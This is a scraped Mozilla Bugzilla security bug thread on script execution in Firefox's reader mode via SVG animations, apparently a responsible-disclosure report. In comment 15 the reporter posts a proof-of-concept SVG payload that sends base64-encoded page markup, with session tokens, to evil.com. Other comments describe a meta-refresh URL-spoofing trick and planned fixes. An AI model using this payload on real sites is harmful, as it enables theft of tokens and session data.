        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-12 01:21 PDT" data-time="1436689277">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-8" data-comment-id="10483491">Wouldn't calling SetSandboxFlags on the document to disable scripting (and anything else you need disabled) be what you need? You basically want to run like SVG does when running as an image (which disables scripting - dholbert may be able to help with that).</pre></div><div class="change-set" id="c9"><div class="comment" data-id="10483543" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a2428_159069"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a2428_159069"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-12 03:09 PDT" data-time="1436695794">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-9" data-comment-id="10483543">With the current architecture, it seems that we do need scripts for the buttons on the left. I hope we can move that into the parent and do as Robert suggests in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c8">comment 8</a>.</pre></div><div class="change-set" id="c11"><div class="comment" data-id="10483577" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a2428_159069"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" id="a2428_159069"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-12 04:39 PDT" data-time="1436701151">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-11" data-comment-id="10483577">(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c9">comment #9</a>)
<span class="quote">&gt; With the current architecture, it seems that we do need scripts for the
&gt; buttons on the left. I hope we can move that into the parent and do as
&gt; Robert suggests in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c8">comment 8</a>.</span >

Another thing I noticed today making this slightly more exploitable:

 * One page loaded in RV can window.open() any other page in RV
 * That means, that a website using CSP can be attacked by any other website opened in RV:
  &gt; Open evil/attacked/MitM'd website in RV
  &gt; Click anywhere on the page
  &gt; Target website with CSP + XSS payload opens in RV
  
Iframing seems not to be possible though. Further, any cross-domain access seems to blocked, so we stay at phishing and spoofing in regards to the impact.</pre></div><div class="change-set" id="a93251_278074"><div class="change" id="aa93251_278074">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278074" id="a93251_278074"><img src="https://secure.gravatar.com/avatar/cd9b85b2e112bd7941b21ad03f42604e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_278074" id="a93251_278074"><a class="email " href="/user_profile?user_id=278074" > <span class="fna">Daniel Holbert [:dholbert]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a93251_278074"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a93251_278074">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a93251_278074">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-12 08:42 PDT" data-time="1436715725">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Summary: Passive script execution on about:read via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing) &rarr; Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)</div></div></div><div class="change-set" id="c12"><div class="comment" data-id="10483729" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a93251_278074"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" id="a93251_278074"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-12 09:25 PDT" data-time="1436718319">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-12" data-comment-id="10483729">(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c9">comment #9</a>)
<span class="quote">&gt; With the current architecture, it seems that we do need scripts for the
&gt; buttons on the left. I hope we can move that into the parent and do as
&gt; Robert suggests in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c8">comment 8</a>.</span >

It seems that in addition to CSP, Content-Disposition headers are being ignored as well. That means, a page that is rendered in RV can open another page in RV even if that other page would otherwise be offered as a download. I assume, the core security assumption here is, that a non-about origin cannot navigate to about:reader?</pre></div><div class="change-set" id="c13"><div class="comment" data-id="10485072" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a93251_278074"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a93251_278074"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-13 02:53 PDT" data-time="1436781221">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-13" data-comment-id="10485072">(In reply to Mario Heiderich from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c12">comment #12</a>)
<span class="quote">&gt; (In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c9">comment #9</a>)
&gt; &gt; With the current architecture, it seems that we do need scripts for the
&gt; &gt; buttons on the left. I hope we can move that into the parent and do as
&gt; &gt; Robert suggests in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c8">comment 8</a>.
&gt; 
&gt; It seems that in addition to CSP, Content-Disposition headers are being
&gt; ignored as well. That means, a page that is rendered in RV can open another
&gt; page in RV even if that other page would otherwise be offered as a download.
&gt; I assume, the core security assumption here is, that a non-about origin
&gt; cannot navigate to about:reader?</span >

We do our best to prevent that, yes. It would be interesting if you noticed a way to bypass this.
(there are currently no particular restrictions in place for what about:reader itself can link to, as you noted.)

I'm personally not sure what the security impact of showing rather than downloading pages with Content-Disposition headers would be.

(CC'ing some more reader mode folks so they can follow along / make suggestions)</pre></div><div class="change-set" id="c14"><div class="comment" data-id="10485365" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a93251_278074"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" id="a93251_278074"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-13 04:49 PDT" data-time="1436788141">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-14" data-comment-id="10485365">(In reply to :Gijs Kruitbosch from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c13">comment #13</a>)
<span class="quote">&gt; (In reply to Mario Heiderich from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c12">comment #12</a>)
&gt; &gt; (In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c9">comment #9</a>)
&gt; &gt; &gt; With the current architecture, it seems that we do need scripts for the
&gt; &gt; &gt; buttons on the left. I hope we can move that into the parent and do as
&gt; &gt; &gt; Robert suggests in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c8">comment 8</a>.
&gt; &gt; 
&gt; &gt; It seems that in addition to CSP, Content-Disposition headers are being
&gt; &gt; ignored as well. That means, a page that is rendered in RV can open another
&gt; &gt; page in RV even if that other page would otherwise be offered as a download.
&gt; &gt; I assume, the core security assumption here is, that a non-about origin
&gt; &gt; cannot navigate to about:reader?
&gt; 
&gt; We do our best to prevent that, yes. It would be interesting if you noticed
&gt; a way to bypass this.
&gt; (there are currently no particular restrictions in place for what
&gt; about:reader itself can link to, as you noted.)
&gt; 
&gt; I'm personally not sure what the security impact of showing rather than
&gt; downloading pages with Content-Disposition headers would be.
&gt; 
&gt; (CC'ing some more reader mode folks so they can follow along / make
&gt; suggestions)</span >

My security concern here is the following:

 * Many websites allow to upload files. Often with HTML/JavaScript content
 * The security measurement in place is usually to offer those files with Content-Disposition:attachment
 * A website loading in RV can link to other websites in RV
 * If an attacker manages to know the link to such uploaded file, they can redirect to it inside RV
 * The otherwise downloaded file will then be displayed as document in RV
 * Potentially embedded JavaScript can now execute

In addition to that, I noticed the following code line:

<a rel="nofollow" href="https://dxr.mozilla.org/mozilla-central/source/toolkit/components/reader/ReaderMode.jsm#204">https://dxr.mozilla.org/mozilla-central/source/toolkit/components/reader/ReaderMode.jsm#204</a>

Here, FF is instructed to parse the document loaded in RV for META Refreshes. If one is found, an XHR is used to fetch the document and display it in RV as well.

This also works for cross-origin requests. The browser's address bar however does not reflect this change. Let's assume the test case in the ticket description above and add the following line of code:

&lt;head&gt;
...
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;URL=<a rel="nofollow" href="https://test.de/">https://test.de/</a>&quot; /&gt;
...
&lt;/head&gt;

The browser will now fire an XHR to test.de, even if loaded from example.com. Then, the content will be shown. Yet, the address bar does NOT update. It will show test.de's content as if it were loaded from example.com.</pre></div><div class="change-set" id="c15"><div class="comment" data-id="10486125" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a93251_278074"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" id="a93251_278074"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-13 08:06 PDT" data-time="1436799961">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-15" data-comment-id="10486125">So, upon another review, I believe that the biggest security relevant impact here is not spoofing / phishing - but being able to steal tokens from the page markup.

The RV uses credentials of course - and in case the page shown in RV contains any link, then with one click we can steal the page markup including the link by using this:

&lt;svg xmlns:xlink=&quot;<a rel="nofollow" href="http://www.w3.org/1999/xlink">http://www.w3.org/1999/xlink</a>&quot;&gt;
	&lt;a xlink:href&gt;
		&lt;circle r=&quot;999&quot;&gt;&lt;/circle&gt;
		&lt;animate attributeName=&quot;xlink:href&quot; from=&quot;javascript:location.replace('<a rel="nofollow" href="http://evil.com/?'+btoa(document.body.innerHTML">http://evil.com/?'+btoa(document.body.innerHTML</a>))&quot; to&gt;&lt;/animate --&gt;
		&lt;foreignObject&gt;&lt;h1 style=&quot;color:red&quot;&gt;XSS&lt;/h1&gt;&lt;/foreignObject&gt;
	&lt;/a&gt;
&lt;/svg&gt;
&lt;a href=&quot;<a rel="nofollow" href="http://www.secret.com/?token=6463287686329461">http://www.secret.com/?token=6463287686329461</a>&quot;&gt;SECRET URL I&lt;/a&gt;
&lt;a href=&quot;<a rel="nofollow" href="http://www.secret.com/?PHPSESSID">http://www.secret.com/?PHPSESSID</a>=&lt;?php echo session_id(); ?&gt;&quot;&gt;SECRET URL II&lt;/a&gt;

The URL spoofing issue based on the mentioned code line is IMHO another, different issue that is, if at all sec-low.</pre></div><div class="change-set" id="c16"><div class="comment" data-id="10486158" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a93251_278074"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a93251_278074"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-13 08:14 PDT" data-time="1436800467">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-16" data-comment-id="10486158">Thanks Mario!

Since this is also a CSP bypass, we should call it sec-moderate. I am busy with meetings today and tomorrow, so I will get to most stuff only later this week.

To summarize, we should address multiple things:
* disable scripting capabilities for reader mode and move the existing buttons into a parent, if possible
* fix the XSS
* make the meta-refresh code more resilient to be case-insensitive
* make the URL bar show the actual page that is opened in reader mode, especially after redirect</pre><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a></div></div></div><div class="change-set" id="c17"><div class="comment" data-id="10486181" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a93251_278074"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" id="a93251_278074"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-13 08:20 PDT" data-time="1436800838">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-17" data-comment-id="10486181">I am happy to provide a remote-hosted PoC if needed. That would demo how to steal tokens and send them across domains from a CSP-enabled page.</pre></div><div class="change-set" id="a335599_428608"><div class="change" id="aa335599_428608">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_428608" id="a335599_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a335599_428608"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a335599_428608">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a335599_428608">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-15 04:01 PDT" data-time="1436958073">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Reader mode check for meta-refresh should not be case-sensitive"
   href="/show_bug.cgi?id=1184056">1184056</a></div></div></div><div class="change-set" id="c18"><div class="comment" data-id="10496692" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a335599_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-15 05:52 PDT" data-time="1436964736">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-18" data-comment-id="10496692">OK, I've done a bit of reading here and there. Readability.js does not sanitize, but really just extracts reading-worthy stuff out. 

Readability code comments say that we want to allow videos and embeds. Does this still hold true, Margaret? If not, we could just put everything into a sandboxed iframe that has scripts disallowed but allow-same-origin set, so we can modify it from the outside.

I don't think we can fix the XSS *and* allow embed/iframe/object.</pre><div class="activity"><div class="change">Flags: needinfo?(fbraun) &rarr; needinfo?(margaret.leibovic)</div></div></div><div class="change-set" id="c20"><div class="comment" data-id="10500532" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_346894" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/9878b2a2629e131ec58a9760e2733b2f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_346894" id="a335599_428608"><a class="email " href="/user_profile?user_id=346894" > <span class="fna">:Margaret Leibovic</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-15 16:16 PDT" data-time="1437002168">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-20" data-comment-id="10500532">(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c18">comment #18</a>)
<span class="quote">&gt; OK, I've done a bit of reading here and there. Readability.js does not
&gt; sanitize, but really just extracts reading-worthy stuff out. 
&gt; 
&gt; Readability code comments say that we want to allow videos and embeds. Does
&gt; this still hold true, Margaret? If not, we could just put everything into a
&gt; sandboxed iframe that has scripts disallowed but allow-same-origin set, so
&gt; we can modify it from the outside.
&gt; 
&gt; I don't think we can fix the XSS *and* allow embed/iframe/object.</span >

I think we do still want to be able to see embedded content, at least videos, since those can be a significant part of the content.

If the main threat is due to scripting in SVG animations, could we just find a way to remove those? Readability.js does attempt to remove scripts from the page content:
<a rel="nofollow" href="https://github.com/mozilla/readability/blob/master/Readability.js#L1019">https://github.com/mozilla/readability/blob/master/Readability.js#L1019</a>

Could we try to make this more aggressive? Or would that likely still leave us open to other vulnerabilities?

I agree that a sanboxed iframe is probably the simplest way to mitigate all risk, but I'd like to make sure that the content users want to see still works.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(margaret.leibovic)</span></div></div></div><div class="change-set" id="c21"><div class="comment" data-id="10501878" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a335599_428608"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a335599_428608"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-16 00:41 PDT" data-time="1437032515">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-21" data-comment-id="10501878">(In reply to :Margaret Leibovic from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c20">comment #20</a>)
<span class="quote">&gt; If the main threat is due to scripting in SVG animations, could we just find
&gt; a way to remove those? Readability.js does attempt to remove scripts from
&gt; the page content:
&gt; <a rel="nofollow" href="https://github.com/mozilla/readability/blob/master/Readability.js#L1019">https://github.com/mozilla/readability/blob/master/Readability.js#L1019</a>
&gt; 
&gt; Could we try to make this more aggressive? Or would that likely still leave
&gt; us open to other vulnerabilities?</span >

In particular, could we use the sanitizer to ditch scripted content but not the embeds/objects, so we keep youtube/vimeo etc. working?</pre><div class="activity"><div class="change">Flags: needinfo?(fbraun)</div></div></div><div class="change-set" id="c22"><div class="comment" data-id="10501994" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-22" role="presentation">
